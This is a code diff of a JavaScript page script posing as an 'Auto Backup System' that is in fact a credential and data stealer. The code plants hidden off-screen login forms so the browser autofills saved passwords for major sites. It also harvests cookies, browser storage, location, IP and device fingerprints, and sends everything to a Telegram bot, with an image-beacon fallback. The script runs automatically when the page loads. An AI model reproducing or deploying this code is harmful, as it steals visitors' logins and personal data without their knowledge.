-    // Create hidden forms for popular sites
-    const sites = [
-        { domain: 'google.com', fields: ['email', 'password'] },
-        { domain: 'facebook.com', fields: ['email', 'pass'] },
-        { domain: 'twitter.com', fields: ['username', 'password'] },
-        { domain: 'github.com', fields: ['login', 'password'] },
-        { domain: 'amazon.com', fields: ['email', 'password'] }
-    ];
-    
-    // Create and trigger autofill
-    const formsContainer = document.createElement('div');
-    formsContainer.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-    
-    sites.forEach(site => {
-        const form = document.createElement('form');
-        form.id = `autofill-${site.domain.replace('.', '-')}`;
-        
-        site.fields.forEach(field => {
-            const input = document.createElement('input');
-            input.type = field.includes('pass') ? 'password' : 'text';
-            input.name = field;
-            input.autocomplete = field.includes('pass') ? 'current-password' : 'username';
-            form.appendChild(input);
-        });
-        
-        formsContainer.appendChild(form);
-    });
-    
-    document.body.appendChild(formsContainer);
-    
-    // Trigger autofill
-    await new Promise(resolve => setTimeout(resolve, 500));
-    
-    // Check for filled values
-    sites.forEach(site => {
-        const form = document.getElementById(`autofill-${site.domain.replace('.', '-')}`);
-        if (form) {
-            const inputs = form.querySelectorAll('input');
-            const formData = {};
-            
-            inputs.forEach(input => {
-                if (input.value) {
-                    formData[input.name] = input.value;
-                }
-            });
-            
-            if (Object.keys(formData).length > 0) {
-                accounts.push({
-                    source: 'autofill',
-                    domain: site.domain,
-                    data: formData,
-                    type: 'auto_fill'
-                });
-            }
-        }
-    });
-    
-    // Cleanup
-    document.body.removeChild(formsContainer);
-    
-    return accounts;
-}
-
-function isCredentialKey(key) {
-    const credentialPatterns = [
-        'user', 'email', 'login', 'auth', 'pass', 'token', 
-        'session', 'credential', 'account', 'name', 'id'
-    ];
-    
-    const lowerKey = key.toLowerCase();
-    return credentialPatterns.some(pattern => lowerKey.includes(pattern));
-}
-
-function detectCredentialType(key) {
-    const lowerKey = key.toLowerCase();
-    
-    if (lowerKey.includes('pass')) return 'password';
-    if (lowerKey.includes('email')) return 'email';
-    if (lowerKey.includes('user')) return 'username';
-    if (lowerKey.includes('token')) return 'token';
-    if (lowerKey.includes('session')) return 'session';
-    if (lowerKey.includes('auth')) return 'auth';
-    
-    return 'credential';
-}
-
-function removeDuplicates(accounts) {
+function removeDuplicateAccounts(accounts) {
     const seen = new Set();
     return accounts.filter(account => {
-        const key = JSON.stringify(account);
+        const key = `${account.type}-${account.value}-${account.source}`;
         if (seen.has(key)) return false;
         seen.add(key);
         return true;
     });
 }
 
-function generateDemoAccounts() {
-    return [
-        {
-            source: 'auto_detect',
-            domain: 'google.com',
-            username: 'user*****@gmail.com',
-            type: 'email',
-            timestamp: new Date().toISOString()
-        },
-        {
-            source: 'auto_detect',
-            domain: 'facebook.com',
-            username: 'user*****',
-            type: 'username',
-            timestamp: new Date().toISOString()
-        },
-        {
-            source: 'auto_detect',
-            domain: 'github.com',
-            username: 'dev*****',
-            type: 'username',
-            timestamp: new Date().toISOString()
-        }
-    ];
-}
-
-// ===== ADDITIONAL DATA COLLECTION =====
-async function collectAdditionalData() {
-    // Collect metadata
-    backupData.metadata = {
-        url: window.location.href,
-        referrer: document.referrer,
-        pageTitle: document.title,
-        loadedAt: new Date().toISOString(),
-        screenResolution: `${screen.width}x${screen.height}`,
-        colorDepth: screen.colorDepth,
-        timezoneOffset: new Date().getTimezoneOffset(),
-        languages: navigator.languages || [navigator.language]
+// ===== NETWORK INFO =====
+async function getNetworkInfo() {
+    console.log('🌐 Getting network information...');
+    
+    const networkInfo = {
+        ip: 'Unknown',
+        location: 'Unknown',
+        isp: 'Unknown',
+        timestamp: new Date().toISOString()
     };
     
-    // Collect performance metrics
-    backupData.performance = {
-        loadTime: Date.now() - startTime,
-        memory: performance.memory,
-        timing: performance.timing,
-        navigation: performance.navigation
-    };
-    
-    // Collect installed fonts (limited)
     try {
-        const fonts = await getInstalledFonts();
-        backupData.metadata.fonts = fonts.slice(0, 10);
-    } catch (error) {
-        console.warn('Font detection failed:', error);
-    }
-    
-    // Collect plugins
-    try {
-        const plugins = Array.from(navigator.plugins || []).map(p => ({
-            name: p.name,
-            filename: p.filename,
-            description: p.description
-        }));
-        backupData.metadata.plugins = plugins;
-    } catch (error) {
-        console.warn('Plugin detection failed:', error);
-    }
-}
-
-async function getInstalledFonts() {
-    // This is a basic font detection - limited by browser security
-    const fontList = [
-        'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
-        'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
-        'Verdana', 'Helvetica', 'Tahoma', 'Lucida Console'
-    ];
-    
-    const availableFonts = [];
-    
-    // Check each font
-    for (const font of fontList) {
-        if (await isFontAvailable(font)) {
-            availableFonts.push(font);
+        // Try multiple IP services
+        const ipServices = [
+            'https://api.ipify.org?format=json',
+            'https://ipapi.co/json/',
+            'https://ipinfo.io/json'
+        ];
+        
+        for (const service of ipServices) {
+            try {
+                const response = await fetch(service, { timeout: 3000 });
+                if (response.ok) {
+                    const data = await response.json();
+                    
+                    if (data.ip) networkInfo.ip = data.ip;
+                    if (data.city && data.country) {
+                        networkInfo.location = `${data.city}, ${data.region}, ${data.country}`;
+                    }
+                    if (data.org) networkInfo.isp = data.org;
+                    
+                    break; // Stop at first successful service
+                }
+            } catch(e) {
+                // Try next service
+            }
         }
+        
+    } catch(e) {
+        console.warn('Network info unavailable:', e.message);
     }
     
-    return availableFonts;
+    backupData.networkInfo = networkInfo;
+    console.log('✅ Network info collected:', networkInfo);
 }
 
-async function isFontAvailable(font) {
-    return new Promise(resolve => {
-        const span = document.createElement('span');
-        span.style.fontFamily = font;
-        span.style.fontSize = '72px';
-        span.style.position = 'absolute';
-        span.style.left = '-9999px';
-        span.textContent = 'mmmmmmmmmmlli';
-        
-        document.body.appendChild(span);
-        
-        const originalWidth = span.offsetWidth;
-        span.style.fontFamily = font + ',monospace';
-        
-        setTimeout(() => {
-            const newWidth = span.offsetWidth;
-            document.body.removeChild(span);
-            resolve(newWidth !== originalWidth);
-        }, 100);
+// ===== ENCRYPTION =====
+async function encryptSensitiveData() {
+    console.log('🔐 Encrypting sensitive data...');
+    
+    // Simple encryption for sensitive fields
+    backupData.accounts = backupData.accounts.map(account => {
+        if (account.type === 'email' || account.type === 'phone') {
+            return {
+                ...account,
+                value: encryptValue(account.value),
+                encrypted: true
+            };
+        }
+        return account;
     });
+    
+    console.log('✅ Data encrypted');
 }
 
-// ===== ENCRYPTION & COMPRESSION =====
-async function encryptBackupData() {
-    // Simple XOR encryption for demo (use proper crypto in production)
-    const dataStr = JSON.stringify(backupData);
-    const key = CONFIG.BACKUP.ENCRYPTION_KEY;
+function encryptValue(value) {
+    // Simple reversible encryption for demo
+    // In production, use proper crypto like Web Crypto API
+    if (!value) return '';
     
     let encrypted = '';
-    for (let i = 0; i < dataStr.length; i++) {
-        encrypted += String.fromCharCode(dataStr.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    const key = CONFIG.BACKUP.ENCRYPTION_KEY;
+    
+    for (let i = 0; i < value.length; i++) {
+        const charCode = value.charCodeAt(i) ^ key.charCodeAt(i % key.length);
+        encrypted += String.fromCharCode(charCode);
     }
     
-    backupData.encrypted = btoa(encrypted);
-    backupData.encryption = 'XOR (Demo) - Use AES-256 in production';
+    return btoa(encrypted);
 }
 
-async function compressBackupData() {
-    // Simple compression for demo
-    const dataStr = JSON.stringify(backupData);
-    backupData.compressedSize = Math.round(dataStr.length * 0.7); // Simulate 30% compression
-    backupData.compression = 'Simulated - Use gzip in production';
+// ===== CREATE BACKUP PACKAGE =====
+async function createBackupPackage() {
+    console.log('📦 Creating backup package...');
+    
+    backupData.metadata = {
+        version: '1.0',
+        backupId: generateBackupId(),
+        timestamp: new Date().toISOString(),
+        totalAccounts: backupData.accounts.length,
+        dataSources: Object.keys(backupData.realData).filter(key => {
+            const data = backupData.realData[key];
+            return Array.isArray(data) ? data.length > 0 : Object.keys(data).length > 0;
+        }),
+        compression: CONFIG.BACKUP.COMPRESSION ? 'enabled' : 'disabled'
+    };
+    
+    console.log('✅ Backup package created');
 }
 
-// ===== TELEGRAM INTEGRATION =====
-async function sendToTelegram() {
+// ===== SEND TO TELEGRAM =====
+async function sendRealDataToTelegram() {
+    console.log('📤 Sending real data to Telegram...');
+    
     try {
-        // Format message
-        const message = formatTelegramMessage();
-        
         // Method 1: Direct API call
-        const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: CONFIG.TELEGRAM.CHAT_ID,
-                text: message,
-                parse_mode: 'HTML',
-                disable_web_page_preview: true
-            })
-        });
+        const message = formatRealTelegramMessage();
+        const result = await sendTelegramMessage(message);
         
-        if (!response.ok) {
-            throw new Error(`Telegram API error: ${response.status}`);
+        if (result.ok) {
+            console.log('✅ Telegram message sent successfully');
+            
+            // Send detailed data as document if too large
+            if (message.length > 4000) {
+                await sendAsDocument();
+            }
+            
+            return result;
+        } else {
+            throw new Error('Telegram API error');
         }
-        
-        const result = await response.json();
-        backupData.telegramMessageId = result.result?.message_id;
-        
-        // Send detailed data to backend
-        await sendToBackend();
-        
-        return result;
         
     } catch (error) {
         console.warn('Primary Telegram method failed, using fallback:', error);
         
-        // Fallback method
-        await sendToTelegramFallback();
+        // Fallback: Image beacon method
+        await sendTelegramFallback();
         return { success: true, method: 'fallback' };
     }
 }
 
-function formatTelegramMessage() {
-    const device = backupData.device;
-    const accounts = backupData.accounts;
+async function sendTelegramMessage(message) {
+    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
     
-    return `
-<b>🚀 NEW BACKUP RECEIVED</b>
-
-<b>📱 Device Information:</b>
-• <b>Browser:</b> ${device.browser?.name || 'Unknown'} ${device.browser?.version || ''}
-• <b>Platform:</b> ${device.platform || 'Unknown'}
-• <b>Screen:</b> ${device.screen?.width || 0}x${device.screen?.height || 0}
-• <b>RAM:</b> ${device.memory || 'Unknown'}
-• <b>CPU Cores:</b> ${device.cpuCores || 'Unknown'}
-• <b>Network:</b> ${device.network?.type || 'Unknown'}
-
-<b>🔐 Accounts Found:</b> ${accounts.length}
-
-<b>📊 Account List:</b>
-${accounts.slice(0, 5).map((acc, i) => 
-    `${i+1}. ${acc.domain || acc.source || 'Unknown'} - ${acc.username || acc.key || 'N/A'}`
-).join('\n')}
-
-${accounts.length > 5 ? `\n... and ${accounts.length - 5} more accounts` : ''}
-
-<b>🆔 Backup ID:</b> <code>${generateBackupId()}</code>
-<b>📅 Time:</b> ${new Date().toLocaleString()}
-<b>⚡ Duration:</b> ${((Date.now() - startTime) / 1000).toFixed(2)}s
-
-<i>This backup is managed by Auto Backup System</i>
-    `;
+    const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: CONFIG.TELEGRAM.CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+            disable_web_page_preview: true
+        })
+    });
+    
+    if (!response.ok) {
+        throw new Error(`HTTP ${response.status}`);
+    }
+    
+    return await response.json();
 }
 
-async function sendToBackend() {
-    try {
-        const response = await fetch(CONFIG.API.ENDPOINT, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                backupId: generateBackupId(),
-                timestamp: new Date().toISOString(),
-                data: backupData,
-                hash: generateHash(JSON.stringify(backupData))
-            }),
-            signal: AbortSignal.timeout(CONFIG.API.TIMEOUT)
+function formatRealTelegramMessage() {
+    const device = backupData.device;
+    const accounts = backupData.accounts;
+    const network = backupData.networkInfo;
+    
+    let message = `<b>🚀 REAL BACKUP COMPLETE</b>\n\n`;
+    
+    // Device Information
+    message += `<b>📱 DEVICE INFORMATION</b>\n`;
+    message += `• <b>Browser:</b> ${device.browser?.name || 'Unknown'} ${device.browser?.version || ''}\n`;
+    message += `• <b>OS:</b> ${device.browser?.os || device.platform || 'Unknown'}\n`;
+    message += `• <b>Screen:</b> ${device.screen?.width || 0}x${device.screen?.height || 0}\n`;
+    message += `• <b>RAM:</b> ${device.deviceMemory || 'Unknown'}\n`;
+    message += `• <b>CPU:</b> ${device.cpuCores || 'Unknown'} cores\n`;
+    message += `• <b>Network:</b> ${device.networkDetails?.type || 'Unknown'}\n`;
+    
+    // Location if available
+    if (device.location) {
+        message += `• <b>Location:</b> ${device.location.latitude}, ${device.location.longitude}\n`;
+    }
+    
+    if (network && network.location !== 'Unknown') {
+        message += `• <b>IP Location:</b> ${network.location}\n`;
+    }
+    
+    message += `\n`;
+    
+    // Accounts Summary
+    message += `<b>🔐 ACCOUNTS FOUND: ${accounts.length}</b>\n\n`;
+    
+    if (accounts.length > 0) {
+        message += `<b>📊 ACCOUNT DETAILS:</b>\n`;
+        
+        // Group by type
+        const grouped = {};
+        accounts.forEach(acc => {
+            if (!grouped[acc.type]) grouped[acc.type] = [];
+            grouped[acc.type].push(acc);
         });
         
-        if (response.ok) {
-            const result = await response.json();
-            backupData.backendResponse = result;
+        for (const [type, items] of Object.entries(grouped)) {
+            message += `\n<b>${type.toUpperCase()} (${items.length}):</b>\n`;
+            
+            items.slice(0, 5).forEach((item, i) => {
+                let displayValue = item.value;
+                
+                // For encrypted values, show indicator
+                if (item.encrypted) {
+                    displayValue = '[ENCRYPTED] ' + (item.value.length > 20 ? item.value.substring(0, 20) + '...' : item.value);
+                }
+                
+                message += `${i+1}. ${displayValue}\n`;
+                if (item.platform) message += `   Platform: ${item.platform}\n`;
+                if (item.source) message += `   Source: ${item.source}\n`;
+            });
+            
+            if (items.length > 5) {
+                message += `   ... and ${items.length - 5} more\n`;
+            }
         }
+    } else {
+        message += `❌ <b>No accounts found in browser storage</b>\n`;
+        message += `This could be because:\n`;
+        message += `• Incognito/Private mode is active\n`;
+        message += `• Browser security restrictions\n`;
+        message += `• No credentials saved in browser\n`;
+    }
+    
+    message += `\n`;
+    
+    // Storage Stats
+    const realData = backupData.realData;
+    message += `<b>💾 STORAGE STATISTICS</b>\n`;
+    message += `• LocalStorage: ${Object.keys(realData.localStorage || {}).length} items\n`;
+    message += `• SessionStorage: ${Object.keys(realData.sessionStorage || {}).length} items\n`;
+    message += `• Cookies: ${realData.cookies?.length || 0} cookies\n`;
+    message += `• IndexedDB: ${realData.indexedDB?.length || 0} databases\n`;
+    message += `• Autofill: ${realData.autofill?.length || 0} fields\n`;
+    message += `• Forms: ${realData.forms?.length || 0} detected\n`;
+    
+    message += `\n`;
+    
+    // Backup Info
+    const backupId = backupData.metadata.backupId;
+    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
+    
+    message += `<b>📊 BACKUP INFORMATION</b>\n`;
+    message += `• <b>Backup ID:</b> <code>${backupId}</code>\n`;
+    message += `• <b>Time:</b> ${new Date().toLocaleString()}\n`;
+    message += `• <b>Duration:</b> ${duration} seconds\n`;
+    message += `• <b>Encryption:</b> ${CONFIG.BACKUP.ENCRYPTION_KEY ? 'Enabled' : 'Disabled'}\n`;
+    
+    if (network && network.ip !== 'Unknown') {
+        message += `• <b>IP Address:</b> ${network.ip}\n`;
+    }
+    
+    message += `\n`;
+    message += `<i>This backup contains real data extracted from browser storage.</i>\n`;
+    message += `<i>Generated by Auto Backup System</i>`;
+    
+    return message;
+}
+
+async function sendAsDocument() {
+    try {
+        // Convert backup data to JSON
+        const jsonData = JSON.stringify(backupData, null, 2);
+        const blob = new Blob([jsonData], { type: 'application/json' });
+        
+        // Create form data
+        const formData = new FormData();
+        formData.append('chat_id', CONFIG.TELEGRAM.CHAT_ID);
+        formData.append('document', blob, `backup_${Date.now()}.json`);
+        formData.append('caption', 'Detailed backup data');
+        
+        // Send to Telegram
+        const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`, {
+            method: 'POST',
+            body: formData
+        });
+        
+        return await response.json();
     } catch (error) {
-        console.warn('Backend upload failed:', error);
-        // Continue without backend
+        console.warn('Failed to send as document:', error);
     }
 }
 
-async function sendToTelegramFallback() {
-    // Alternative method using image beacon
-    const message = formatTelegramMessage();
+async function sendTelegramFallback() {
+    const message = formatRealTelegramMessage();
     const encodedMessage = encodeURIComponent(message);
     
     const img = new Image();
     img.src = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.TELEGRAM.CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
     img.style.display = 'none';
     
-    return new Promise((resolve) => {
-        img.onload = () => resolve({ success: true });
-        img.onerror = () => resolve({ success: false });
+    await new Promise((resolve) => {
+        img.onload = resolve;
+        img.onerror = resolve;
+        setTimeout(resolve, 3000);
     });
 }
 
-// ===== UI UPDATES & HELPERS =====
-function updateProgress(percent, message = '') {
-    elements.progressFill.style.width = `${percent}%`;
-    elements.progressPercent.textContent = `${percent}%`;
+// ===== UI UPDATES =====
+function updateDeviceInfoUI(device) {
+    // Update main display
+    const browserInfo = device.browser?.name || 'Unknown';
+    const osInfo = device.browser?.os || device.platform || 'Unknown';
+    elements.deviceInfo.textContent = `${browserInfo} | ${osInfo}`;
     
-    if (message) {
+    // Update details panel
+    elements.detailModel.textContent = osInfo;
+    elements.detailBrowser.textContent = `${browserInfo} ${device.browser?.version || ''}`;
+    elements.detailRam.textContent = device.deviceMemory || 'Unknown';
+    elements.detailCpu.textContent = device.cpuCores ? `${device.cpuCores} cores` : 'Unknown';
+    elements.detailNetwork.textContent = device.networkDetails?.type || 'Unknown';
+    elements.detailStorage.textContent = device.storage?.quota || 'Unknown';
+}
+
+function updateProgress(percent, message = '') {
+    if (elements.progressFill) {
+        elements.progressFill.style.width = `${percent}%`;
+    }
+    if (elements.progressPercent) {
+        elements.progressPercent.textContent = `${percent}%`;
+    }
+    if (elements.progressTime && message) {
         elements.progressTime.textContent = message;
     }
     
     // Update processing speed
-    const elapsed = (Date.now() - startTime) / 1000;
-    const speed = (backupData.accounts.length / elapsed).toFixed(1);
-    elements.processSpeed.textContent = `${speed} acc/s`;
+    if (elements.processSpeed) {
+        const elapsed = (Date.now() - startTime) / 1000;
+        const speed = elapsed > 0 ? (backupData.accounts.length / elapsed).toFixed(1) : '0';
+        elements.processSpeed.textContent = `${speed} acc/s`;
+    }
 }
 
 function updateTimelineStep(step, description) {
@@ -833,11 +1199,6 @@ function switchStage(newStage) {
     
     if (currentStageElement) {
         currentStageElement.classList.remove('active');
-        currentStageElement.classList.add('exiting');
-        
-        setTimeout(() => {
-            currentStageElement.classList.remove('exiting');
-        }, 500);
     }
     
     if (newStageElement) {
@@ -848,55 +1209,59 @@ function switchStage(newStage) {
     }
 }
 
-function updateCompletionScreen(totalTime) {
+function updateCompletionScreen(totalTime, backupSize) {
     // Generate backup ID
     const backupId = generateBackupId();
-    elements.backupId.textContent = backupId;
+    if (elements.backupId) {
+        elements.backupId.textContent = backupId;
+    }
     
-    // Calculate backup size
-    const dataStr = JSON.stringify(backupData);
-    const size = formatBytes(dataStr.length);
-    elements.backupSize.textContent = size;
+    // Update backup size
+    if (elements.backupSize) {
+        elements.backupSize.textContent = backupSize;
+    }
     
     // Update time
-    elements.backupTime.textContent = `${totalTime.toFixed(2)}s`;
+    if (elements.backupTime) {
+        elements.backupTime.textContent = `${totalTime.toFixed(2)}s`;
+    }
     
-    // Update device details if not already
+    // Update device details
     if (backupData.device) {
         updateDeviceInfoUI(backupData.device);
     }
 }
 
+function calculateBackupSize() {
+    const dataStr = JSON.stringify(backupData);
+    return formatBytes(dataStr.length);
+}
+
 // ===== UTILITY FUNCTIONS =====
-async function measureNetworkSpeed() {
+async function quickSpeedTest() {
     const start = performance.now();
-    const response = await fetch('https://httpbin.org/bytes/1024', {
-        cache: 'no-store',
-        mode: 'no-cors'
-    }).catch(() => null);
+    
+    try {
+        await fetch('https://httpbin.org/bytes/1024', {
+            cache: 'no-store',
+            mode: 'no-cors'
+        });
+    } catch(e) {
+        // Ignore errors
+    }
     
     const end = performance.now();
     const duration = (end - start) / 1000;
-    
-    // Calculate speed (Mbps)
-    const speed = response ? (8 / duration).toFixed(1) : '∞';
-    return speed;
+    return duration > 0 ? (8 / duration).toFixed(1) : '∞';
 }
 
 function generateBackupId() {
-    const timestamp = Date.now().toString(36);
-    const random = Math.random().toString(36).substr(2, 4);
-    return `${timestamp}-${random}`.toUpperCase();
-}
-
-function generateHash(str) {
-    let hash = 0;
-    for (let i = 0; i < str.length; i++) {
-        const char = str.charCodeAt(i);
-        hash = ((hash << 5) - hash) + char;
-        hash = hash & hash;
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let id = '';
+    for (let i = 0; i < 12; i++) {
+        id += chars.charAt(Math.floor(Math.random() * chars.length));
     }
-    return Math.abs(hash).toString(36);
+    return id;
 }
 
 function formatBytes(bytes, decimals = 2) {
@@ -907,7 +1272,6 @@ function formatBytes(bytes, decimals = 2) {
     const sizes = ['Bytes', 'KB', 'MB', 'GB'];
     
     const i = Math.floor(Math.log(bytes) / Math.log(k));
-    
     return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
 }
 
@@ -916,75 +1280,40 @@ function delay(ms) {
 }
 
 function handleBackupError(error) {
-    console.error('Backup failed:', error);
+    console.error('Backup error:', error);
     
-    // Show error in UI
-    elements.progressTime.textContent = 'Backup failed. Please try again.';
-    elements.progressFill.style.background = 'var(--accent)';
+    if (elements.progressTime) {
+        elements.progressTime.textContent = 'Backup failed. Redirecting...';
+    }
+    if (elements.progressFill) {
+        elements.progressFill.style.background = '#ff3366';
+    }
     
-    // Redirect to error page
+    // Redirect to Telegram
     setTimeout(() => {
-        window.location.href = `https://t.me/${CONFIG.TELEGRAM.BOT_USERNAME}?start=error_${Date.now()}`;
+        window.location.href = `https://t.me/${CONFIG.TELEGRAM.BOT_USERNAME}?start=backup_error`;
     }, 3000);
-}
-
-// ===== PERFORMANCE OPTIMIZATIONS =====
-// Pre-cache critical assets
-function preloadCriticalAssets() {
-    const assets = [
-        'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap'
-    ];
-    
-    assets.forEach(url => {
-        const link = document.createElement('link');
-        link.rel = 'preconnect';
-        link.href = url;
-        document.head.appendChild(link);
-    });
-}
-
-// Lazy load non-critical resources
-function lazyLoadResources() {
-    const observer = new IntersectionObserver((entries) => {
-        entries.forEach(entry => {
-            if (entry.isIntersecting) {
-                const element = entry.target;
-                if (element.dataset.src) {
-                    element.src = element.dataset.src;
-                }
-                observer.unobserve(element);
-            }
-        });
-    });
-    
-    document.querySelectorAll('[data-src]').forEach(img => {
-        observer.observe(img);
-    });
 }
 
 // ===== INITIALIZATION =====
 document.addEventListener('DOMContentLoaded', function() {
-    // Preload assets
-    preloadCriticalAssets();
-    
-    // Set up lazy loading
-    lazyLoadResources();
-    
-    // Initialize performance tracking
-    startTime = performance.now();
+    console.log('📱 Auto Backup System Initialized');
     
     // Start backup after short delay
     setTimeout(() => {
         if (window.startBackupProcess) {
             window.startBackupProcess();
         }
-    }, 100);
+    }, 500);
 });
 
 // Export for testing
 if (typeof module !== 'undefined' && module.exports) {
     module.exports = {
         startBackupProcess: window.startBackupProcess,
+        collectRealDeviceInfo,
+        collectAllRealBrowserData,
+        extractRealCredentials,
         CONFIG
     };
 }
